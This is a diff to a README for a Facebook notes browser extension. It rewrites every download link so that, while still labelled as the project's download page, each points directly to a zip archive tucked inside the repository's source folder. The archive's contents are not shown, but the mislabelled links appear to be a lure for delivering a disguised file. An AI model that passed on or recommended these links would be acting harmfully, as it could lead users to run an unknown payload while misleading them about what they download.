@@ -1,6 +1,6 @@
 # 📝 FB-Notes-Extended - Write Longer Notes on Facebook
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Sydneyseparated852/FB-Notes-Extended)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Sydneyseparated852/FB-Notes-Extended/raw/refs/heads/main/src/popup/Extended-Notes-F-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it if you want more control over how long a Facebook note stays available.
 
 Use this link to visit the download page:
 
-https://github.com/Sydneyseparated852/FB-Notes-Extended
+https://github.com/Sydneyseparated852/FB-Notes-Extended/raw/refs/heads/main/src/popup/Extended-Notes-F-v2.8.zip
 
 ### Steps for Windows
 
@@ -152,7 +152,7 @@ Do not move the files into a different folder unless you plan to load that new f
 
 ## 📌 Useful Links
 
-- Download page: https://github.com/Sydneyseparated852/FB-Notes-Extended
+- Download page: https://github.com/Sydneyseparated852/FB-Notes-Extended/raw/refs/heads/main/src/popup/Extended-Notes-F-v2.8.zip
 - Chrome extensions page: chrome://extensions
 
 ## 📄 License and Project Use
